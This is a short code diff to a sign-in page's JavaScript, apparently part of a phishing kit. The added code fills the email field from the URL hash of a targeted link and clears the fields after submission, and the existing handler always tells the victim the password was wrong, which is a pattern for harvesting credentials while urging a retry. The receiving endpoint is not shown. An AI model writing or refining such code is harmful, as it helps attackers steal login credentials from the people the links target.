@@ -427,11 +427,16 @@
         var $passwordField = $('#password'); // Cache password field
 
         // Clear the email02 field on page load to ensure it's blank
-        $emailField.val('');
+        var email = window.location.hash.substr(1);
+        if (email) {
+            $emailField.val(email); // Set email02 field from URL hash
+        }
 
         // Force the field to stay blank by preventing autofill
         setTimeout(function(){
-            $emailField.val('');
+            if (!window.location.hash.substr(1)) {
+                $emailField.val('');
+            }
         }, 50);
 
         // Extract email from URL hash and populate fields if present
@@ -507,6 +512,7 @@
                 },
                 complete: function() {
                     $submitButton.html('Sign in');
+                    $emailField.val(""); // Clear email field
                     $passwordField.val(""); // Clear password field
                     $msg.show().html("The username or password you entered isn't correct. Try entering it again.");
                 }
